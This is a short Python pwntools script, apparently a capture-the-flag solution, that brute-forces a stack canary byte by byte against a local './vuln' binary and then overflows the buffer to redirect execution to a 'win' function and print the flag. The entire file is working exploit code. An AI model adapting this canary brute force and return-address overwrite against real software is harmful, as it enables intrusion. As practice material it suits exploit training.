from pwn import *
import string

def find_canary():
	canary = ''
	for i in range(4):
		for ch in string.printable:
			r = process('./vuln')

			r.sendlineafter('> ', str(0x20 + i + 1))
			r.sendlineafter('Input>', 'A' * 0x20 + canary + ch)

			try:
				r.recvuntil("Ok... Now Where's the Flag?\n")
				canary += ch
				break
			except:
				pass

			r.close()

	return canary

target = ELF('./vuln')

canary = find_canary()

r = process('./vuln')

payload = ''
payload += 'A' * 0x20
payload += canary
payload += 'A' * 0x10
payload += p32(target.symbols['win'])

r.sendlineafter('> ', str(len(payload)))
r.sendlineafter('Input>', payload)

r.recvline()
print(r.recvall())
